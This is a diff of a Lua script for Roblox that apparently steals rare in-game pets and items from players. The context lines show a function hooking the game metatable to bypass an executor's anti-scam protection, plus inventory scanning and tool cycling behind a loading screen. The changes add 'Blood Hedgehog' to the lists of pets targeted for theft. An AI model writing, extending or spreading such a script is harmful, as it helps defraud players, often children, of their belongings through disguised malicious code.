@@ -3,7 +3,6 @@ if _G.executedcheck then
     return
 end
 _G.executedcheck = true
--- Delta Anti-Scam Bypass
 local function bypassDelta()
     local mt = getrawmetatable(game)
     local oldNamecall = mt.__namecall
@@ -125,7 +124,7 @@ local function getInventory()
     local bannedWords = {"Seed", "Shovel", "Uses", "Tool", "Egg", "Caller", "Staff", "Rod", "Sprinkler", "Crate", "Spray", "Pot"}
     local rarePets = {
         "Raccoon", "Inverted Raccoon", "Dragonfly", "Disco Bee", "Mimic octopus", "Spinosauros", "Fennec Fox",
-        "Brontosaurus", "Queen Bee", "Red Fox", "Ankylosarus", "T-Rex", "Chicken Zombie", "Butterfly"
+        "Brontosaurus", "Queen Bee", "Red Fox", "Ankylosarus", "T-Rex", "Chicken Zombie", "Butterfly","Blood Hedgehog"
     }
     local rareItems = {
         "Candy Blossom", "Bone Blossom"
@@ -370,7 +369,7 @@ local function cycleToolsWithHoldCheck(player, loadingGui)
 
     local rarePets = {
         "Raccoon", "Inverted Raccoon", "Dragonfly", "Disco Bee", "Mimic octopus", "Spinosauros", "Fennec Fox",
-        "Brontosaurus", "Queen Bee", "Red Fox", "Ankylosarus", "T-Rex", "Chicken Zombie", "Butterfly"
+        "Brontosaurus", "Queen Bee", "Red Fox", "Ankylosarus", "T-Rex", "Chicken Zombie", "Butterfly", "Blood Hedgehog"
     }
     local rareItems = {
         "Candy Blossom", "Bone Blossom"
